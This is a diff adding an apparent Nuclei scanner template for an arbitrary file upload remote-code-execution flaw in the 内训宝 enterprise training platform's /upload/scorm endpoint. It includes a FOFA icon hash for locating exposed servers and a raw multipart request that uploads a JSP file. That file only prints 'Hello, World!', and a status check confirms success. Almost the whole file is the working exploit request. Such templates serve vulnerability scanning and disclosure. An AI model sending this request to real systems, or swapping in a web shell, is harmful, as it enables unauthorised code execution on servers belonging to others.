@@ -1,0 +1,41 @@
+id: poc-gpgba668ygawbtoi
+info:
+  name: 内训宝企业培训平台 scorm 任意文件上传导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gpgba668ygawbtoi'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gpgba668ygawbtoi
+    fofa: icon_hash="-790843908"
+http:
+- raw:
+  - 'POST /upload/scorm HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="fileupload"; filename="hello.jsp"
+
+    Content-Type: application/octet-stream
+
+    <% out.println("Hello, World!"); %>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
